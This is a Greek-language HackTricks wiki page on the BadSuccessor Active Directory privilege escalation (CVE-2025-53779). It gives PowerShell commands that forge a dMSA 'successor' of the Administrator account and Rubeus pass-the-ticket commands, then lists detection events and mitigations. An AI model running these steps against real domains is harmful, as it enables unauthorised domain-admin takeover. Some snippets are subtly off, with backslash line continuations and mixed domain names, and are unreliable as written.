# BadSuccessor: Privilege Escalation μέσω κατάχρησης Delegated MSA Migration

{{#include ../../banners/hacktricks-training.md}}

## Επισκόπηση

Τα Delegated Managed Service Accounts (**dMSA**) είναι οι διάδοχοι επόμενης γενιάς των **gMSA**, που περιλαμβάνονται στα Windows Server 2025. Μια νόμιμη ροή migration επιτρέπει στους administrators να αντικαταστήσουν έναν *παλιό* λογαριασμό (user, computer ή service account) με ένα dMSA, διατηρώντας διαφανώς τα permissions. Η ροή εκτίθεται μέσω PowerShell cmdlets όπως τα `Start-ADServiceAccountMigration` και `Complete-ADServiceAccountMigration` και βασίζεται σε δύο LDAP attributes του **dMSA object**:

* **`msDS-ManagedAccountPrecededByLink`** – *DN link* προς τον αντικατασταθέντα (παλιό) λογαριασμό.
* **`msDS-DelegatedMSAState`**       – κατάσταση migration (`0` = none, `1` = in-progress, `2` = *completed*).<sup>[[1]](#references)</sup>

Αν ένας attacker μπορεί να δημιουργήσει **οποιοδήποτε** dMSA μέσα σε ένα OU και να τροποποιήσει απευθείας αυτά τα 2 attributes, τα LSASS και KDC θα αντιμετωπίσουν το dMSA ως *successor* του συνδεδεμένου λογαριασμού. Όταν ο attacker πραγματοποιήσει στη συνέχεια authentication ως το dMSA, **κληρονομεί όλα τα privileges του συνδεδεμένου λογαριασμού** – έως και **Domain Admin**, αν συνδεθεί ο λογαριασμός Administrator.<sup>[[1]](#references)</sup>

Η τεχνική ονομάστηκε **BadSuccessor** από τη Unit 42 το 2025. Αργότερα, η Microsoft της ανέθεσε το **CVE-2025-53779** και κυκλοφόρησε security update τον **Αύγουστο του 2025**. Η τεχνική παραμένει σχετική σε unpatched περιβάλλοντα Windows Server 2025 και σε ελέγχους επικίνδυνου OU delegation.<sup>[[1]](#references)[[2]](#references)[[6]](#references)</sup>

### Προαπαιτούμενα επίθεσης

1. Ένας λογαριασμός που *επιτρέπεται* να δημιουργεί objects μέσα σε **ένα Organizational Unit (OU)** και διαθέτει τουλάχιστον ένα από τα εξής:
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** object class
* `Create Child` → **`All Objects`** (generic create)
2. Network connectivity προς LDAP και Kerberos (τυπικό domain joined σενάριο / remote attack).<sup>[[1]](#references)</sup>

## Enumerating Vulnerable OUs

Η Unit 42 κυκλοφόρησε ένα PowerShell helper script που αναλύει τα security descriptors κάθε OU και επισημαίνει τα απαιτούμενα ACEs:<sup>[[1]](#references)</sup>
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Στο παρασκήνιο, το script εκτελεί ένα paged LDAP search για `(objectClass=organizationalUnit)` και ελέγχει κάθε `nTSecurityDescriptor` για

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `Active Directory Schema ID: 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (object class *msDS-DelegatedManagedServiceAccount*)

## Βήματα Exploitation

Μόλις εντοπιστεί ένα writable OU, η επίθεση απέχει μόλις 3 LDAP writes:<sup>[[1]](#references)</sup>
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Μετά το replication, ο attacker μπορεί απλώς να κάνει **logon** ως `attacker_dMSA$` ή να ζητήσει ένα Kerberos TGT – τα Windows θα δημιουργήσουν το token του *superseded* account.<sup>[[1]](#references)</sup>

### Αυτοματοποίηση

Αρκετά public PoCs περιλαμβάνουν ολόκληρο το workflow, συμπεριλαμβανομένης της ανάκτησης κωδικού πρόσβασης και της διαχείρισης ticket:

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)<sup>[[3]](#references)</sup>
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)<sup>[[4]](#references)</sup>
* NetExec module – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)<sup>[[5]](#references)</sup>

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Ανίχνευση & Hunting

Ενεργοποιήστε το **Object Auditing** στα OU και παρακολουθείτε τα ακόλουθα Windows Security Events:<sup>[[1]](#references)[[2]](#references)</sup>

* **5137** – Δημιουργία του αντικειμένου **dMSA**
* **5136** – Τροποποίηση του **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Αλλαγές συγκεκριμένων attributes
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Έκδοση TGT για το dMSA

Η συσχέτιση των `4662` (τροποποίηση attribute), `4741` (δημιουργία computer/service account) και `4624` (μεταγενέστερο logon) αναδεικνύει γρήγορα activity του BadSuccessor. Λύσεις XDR όπως το **XSIAM** παρέχουν έτοιμα προς χρήση queries (δείτε τις references).<sup>[[2]](#references)</sup>

## Μετριασμός

* Εφαρμόστε το security update της Microsoft για το **CVE-2025-53779** και επαληθεύστε το patch level κάθε domain controller με Windows Server 2025.<sup>[[6]](#references)</sup>
* Εφαρμόστε την αρχή του **least privilege** – αναθέστε τη διαχείριση των *Service Account* μόνο σε έμπιστους ρόλους.
* Αφαιρέστε τα `Create Child` / `msDS-DelegatedManagedServiceAccount` από OU που δεν τα απαιτούν ρητά.
* Παρακολουθείτε τα event IDs που αναφέρονται παραπάνω και δημιουργήστε alert όταν identities εκτός *Tier-0* δημιουργούν ή επεξεργάζονται dMSAs.

## Δείτε επίσης


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [BadSuccessor: Κατάχρηση του dMSA για Escalate Privileges στο Active Directory – Akamai](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [2] [Unit42 – Όταν οι καλοί λογαριασμοί γίνονται κακοί: Εκμετάλλευση Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [3] [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [4] [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [5] [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)
- [6] [Microsoft Security Response Center – CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
{{#include ../../banners/hacktricks-training.md}}
